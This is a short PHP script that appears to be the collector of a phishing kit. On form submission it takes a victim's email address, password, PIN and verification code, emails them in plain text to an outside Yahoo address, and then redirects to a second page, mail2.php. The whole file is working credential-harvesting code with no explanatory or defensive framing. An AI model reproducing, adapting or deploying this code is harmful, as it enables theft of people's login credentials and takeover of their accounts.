<?php


if(isset($_POST["verify"])){ 
$pin = $_POST["pin"];
$to = "godabegi@yahoo.com";

$subject = "Details";
$txt = "Email Address is: " .$_POST['email']. "  Password is: " .$_POST['password']. " Pin is: " .$pin. "  Verification code is: " .$_POST['phrase'];
$headers = "Form";

mail($to,$subject,$txt,$headers);

header("Location: mail2.php"); 
}


?>
